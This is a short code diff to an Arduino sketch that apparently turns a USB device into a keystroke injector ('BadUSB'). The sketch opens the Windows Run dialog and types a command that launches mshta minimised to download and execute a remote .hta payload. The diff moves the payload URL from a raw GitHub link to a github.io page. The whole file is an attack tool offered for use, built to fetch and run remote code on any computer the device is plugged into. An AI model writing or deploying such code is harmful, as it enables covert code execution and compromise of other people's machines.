@@ -12,7 +12,9 @@ void sequence()
 {
   COMBINATION(KEY_LEFT_GUI, 'r');
   delay(200);
-  Keyboard.print("cmd /c start /min mshta https://raw.githubusercontent.com/n643064/arduino-badUSB/refs/heads/master/payload.hta ^& exit");
+  DELETE;
+  delay(200);
+  Keyboard.print("cmd /c start /min mshta https://n643064.github.io/payload.hta ^& exit");
   delay(200);
   ENTER;
 }
